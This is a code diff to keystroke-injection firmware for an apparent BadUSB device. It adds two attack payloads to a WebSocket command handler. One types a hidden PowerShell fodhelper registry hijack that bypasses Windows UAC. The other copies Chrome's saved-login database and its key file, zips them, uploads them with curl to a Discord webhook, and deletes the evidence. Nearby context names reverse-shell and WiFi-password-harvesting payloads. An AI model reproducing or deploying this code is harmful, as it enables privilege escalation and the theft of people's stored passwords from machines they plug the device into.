@@ -489,6 +489,65 @@ static void webSocketEvent(uint8_t num, WStype_t type, uint8_t *payload,
         delay(20);
         Keyboard.releaseAll();
         LOG("[WebKB] RevShell+ launched\n");
+      } else if (combo == "UACBypass") {
+        // Fodhelper UAC Bypass Demonstration (Auto-elevates to Admin without prompt if user is in Admin group)
+        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press('r');
+        delay(20);
+        Keyboard.releaseAll();
+        delay(800);
+        Keyboard.print("cmd");
+        delay(200);
+        Keyboard.press(KEY_RETURN);
+        delay(20);
+        Keyboard.releaseAll();
+        delay(1000);
+        Keyboard.print(
+            "powershell -w h -nop -ep bypass -c \""
+            "New-Item 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Force;"
+            "New-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name 'DelegateExecute' -Value '' -Force;"
+            "Set-ItemProperty -Path 'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command' -Name '(default)' -Value 'cmd.exe /c start powershell.exe -NoExit -Command Write-Host \"\"\"UAC BYPASSED - RUNNING AS SYSTEM/ADMIN\"\"\" -ForegroundColor Red' -Force;"
+            "Start-Process 'C:\\Windows\\System32\\fodhelper.exe';"
+            "Start-Sleep -s 3;"
+            "Remove-Item 'HKCU:\\Software\\Classes\\ms-settings' -Recurse -Force\" & exit");
+        delay(300);
+        Keyboard.press(KEY_RETURN);
+        delay(20);
+        Keyboard.releaseAll();
+        LOG("[WebKB] UACBypass launched\n");
+      } else if (combo == "ChromeExfil") {
+        // Exfiltrate Chrome Local State and Login Data to Discord
+        Keyboard.press(KEY_LEFT_GUI);
+        Keyboard.press('r');
+        delay(20);
+        Keyboard.releaseAll();
+        delay(800);
+        Keyboard.print("cmd");
+        delay(200);
+        Keyboard.press(KEY_RETURN);
+        delay(20);
+        Keyboard.releaseAll();
+        delay(1000);
+        Keyboard.print(
+            "powershell -w h -nop -ep bypass -c \""
+            "$t=$env:TEMP+'\\c.zip';"
+            "$l=$env:LOCALAPPDATA+'\\Google\\Chrome\\User Data\\Local State';"
+            "$d=$env:LOCALAPPDATA+'\\Google\\Chrome\\User Data\\Default\\Login Data';"
+            "$w=$env:TEMP+'\\w';"
+            "mkdir $w -Force;"
+            "if(Test-Path $l){Copy-Item $l $w};"
+            "if(Test-Path $d){Copy-Item $d $w};"
+            "Compress-Archive -Path $w\\* -DestinationPath $t -Force;"
+            "curl.exe -F ('file=@'+$t) "
+            "https://discord.com/api/webhooks/1480962111373840517/"
+            "0-Gri-o1InK_yxi4LOPnyFxu_hYIzkZNztq8gNadm9zj7yQg-"
+            "ciyqaBjdfxN4zgmmvD3;"
+            "Remove-Item $w -Recurse -Force;Remove-Item $t -Force\" & exit");
+        delay(300);
+        Keyboard.press(KEY_RETURN);
+        delay(20);
+        Keyboard.releaseAll();
+        LOG("[WebKB] ChromeExfil launched\n");
       } else if (combo == "WiFiHarvest") {
         // Extract all saved WiFi passwords and send to Discord
         Keyboard.press(KEY_LEFT_GUI);
